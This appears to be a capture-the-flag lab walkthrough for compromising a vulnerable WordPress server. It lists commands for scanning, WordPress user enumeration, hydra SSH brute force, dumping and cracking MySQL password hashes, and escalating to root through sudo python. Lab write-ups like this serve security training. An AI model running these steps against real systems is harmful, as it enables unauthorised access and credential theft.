# Attacking_and_Defending_Vulnerable_Wordpress_Server
Attacking the Vulnerable WordPress Server:
1. Using netdiscover to find IP Address
2. Using nmap -p- -sV 192.168.1.110 to show that SSH is open on the WordPress Server
3. Using wpscan --url 192.168.1.110/wordpress --enumerate u - to show the 2 users from the wpscan
4. Using hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.110 -t 4 to show the password for michael
5. Using ssh michael@192.168.1.110 to get into the machine
6. Searching until you find the service.html file
7. Cat Service.html - flag1
8. Using find -type f -iname 'flag*' 2>dev/null
9. cd to ./var/www | cat flag2.txt
10. Getting into the MySQL database:
11. mysql -h localhost -u root -p
12. Using show databases
13. Then use wordpress
14. Typing select user_login, user_pass from wp_users to find the user password hashes
15. Copying password hashes into a txt file 
16. Using John against that txt file to find the other user's password
17. ssh into steven@192.168.1.110
18. Then, typing sudo -l to see what can be ran with root priviliges
19. Python can be ran as sudo
20. Using sudo python -c 'import pty;pty.spawn(*/bin/bash*);'
